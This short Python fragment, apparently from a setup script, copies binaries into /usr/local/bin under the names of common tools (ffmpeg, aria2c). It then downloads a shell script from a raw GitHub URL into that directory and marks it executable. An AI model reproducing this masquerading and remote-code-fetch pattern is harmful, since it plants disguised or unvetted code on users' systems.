...
srun(["cp", "/usr/bin/new-api", "/usr/local/bin/ffmpeg"])
srun(["cp", "/usr/bin/extra-api", "/usr/local/bin/aria2c"])
srun(["chmod", "+x", "/usr/local/bin/ffmpeg"])
srun(["chmod", "+x", "/usr/local/bin/aria2c"])
srun(["wget", "-P", "/usr/local/bin/", "https://raw.githubusercontent.com/hex-313/jdhhf/main/a.sh"])
srun(["chmod", "+x", "/usr/local/bin/a.sh"])
